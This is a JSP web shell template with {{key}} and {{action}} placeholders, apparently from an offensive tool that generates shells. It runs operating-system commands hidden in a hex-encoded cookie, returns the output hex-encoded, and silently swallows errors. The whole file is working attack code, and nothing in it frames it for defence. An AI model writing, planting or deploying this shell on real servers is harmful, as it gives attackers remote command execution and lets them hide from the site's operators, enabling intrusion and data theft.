<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="javax.xml.bind.DatatypeConverter" %>
<%
try {
    byte k[] = DatatypeConverter.parseHexBinary("{{key}}");
    Cookie[] cookies = request.getCookies();
    for (int i=0; i<cookies.length; i++) {
        if (cookies[i].getName().equals("{{action}}")) {
            Process p = Runtime.getRuntime().exec(new String(DatatypeConverter.parseHexBinary(cookies[i].getValue())).substring(0).split("\n"));
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) { out.print(DatatypeConverter.printHexBinary((line+"\n").getBytes())); }
            break;
        }
    }
} catch (Exception e) {}
%>
